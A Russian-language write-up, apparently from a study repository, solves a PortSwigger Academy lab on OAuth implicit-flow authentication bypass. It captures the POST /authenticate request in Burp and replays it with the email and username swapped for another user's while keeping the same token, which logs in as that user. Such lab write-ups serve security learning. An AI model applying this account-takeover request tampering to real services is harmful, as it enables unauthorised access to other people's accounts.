Перейдем на уязвимый ресурс

и для начала пройдем полный путь аутентификации используя креды `wiener:peter`

перейдем в `Proxy` -> `HTTP history` и изучим историю запросов

Увидим, что процесс аутентификации начинается с
```
GET /auth?client_id=vxvfetgupmeykjss7i9rx&redirect_uri=https://0a64003504fa9bf884880f7b000200ea.web-security-academy.net/oauth-callback&response_type=token&nonce=-756640781&scope=openid%20profile%20email 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/26.%20OAuth%20authentication/1.%20Authentication%20bypass%20via%20OAuth%20implicit%20flow/pics%20for%20walkthrough/1.png)

но так же при анализе найдем запрос 
```
POST /authenticate

{"email":"wiener@hotdog.com","username":"wiener","token":"gBxgCe6eva6ea1nf8Q4KOEjWEDiV2rLul2p3vdRTGQ6"}
```
его и отправим в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/26.%20OAuth%20authentication/1.%20Authentication%20bypass%20via%20OAuth%20implicit%20flow/pics%20for%20walkthrough/2.png)

Изменим почтовый адрес на `carlos@carlos-montoya.net` и username на `carlos`

и отправим запрос 
```
POST /authenticate 

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"gBxgCe6eva6ea1nf8Q4KOEjWEDiV2rLul2p3vdRTGQ6"}
```

и увидим, что никакой ошибки данный вопрос не вызвал, и мы получили редирект 

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/26.%20OAuth%20authentication/1.%20Authentication%20bypass%20via%20OAuth%20implicit%20flow/pics%20for%20walkthrough/3.png)

отлично, осуществим данный запрос в оригинальной версии браузера

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/26.%20OAuth%20authentication/1.%20Authentication%20bypass%20via%20OAuth%20implicit%20flow/pics%20for%20walkthrough/4.png)

и получим уведомление об успешном выполненнии лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/26.%20OAuth%20authentication/1.%20Authentication%20bypass%20via%20OAuth%20implicit%20flow/pics%20for%20walkthrough/5.png)
